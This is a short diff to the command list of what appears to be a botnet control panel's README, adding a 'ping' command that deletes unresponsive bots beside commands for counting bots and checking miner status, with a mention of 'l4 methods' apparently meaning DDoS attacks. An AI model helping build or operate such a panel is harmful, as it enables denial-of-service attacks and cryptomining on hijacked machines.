@@ -11,6 +11,7 @@ github.com/udbnt  - Upgrade l4 methods
 
 # Commands
 * help # Help menu
+* ping # Ping bots (If does not respond, bot will be deleted)
 * bots # Total bots
 * clear # Clear Terminal
 * Stat # Miners statue
